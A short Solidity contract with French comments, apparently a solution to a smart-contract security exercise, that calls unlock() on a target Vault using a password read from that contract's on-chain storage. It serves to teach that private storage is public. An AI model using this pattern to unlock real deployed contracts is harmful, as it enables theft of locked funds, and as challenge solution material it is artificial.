// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface pour interagir avec Vault
interface IVault {
    function unlock(bytes32 _password) external;
}

contract VaultAttacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack(bytes32 _password) public {
        // Appelle unlock() avec le password lu depuis le storage
        IVault(target).unlock(_password);
    }
}
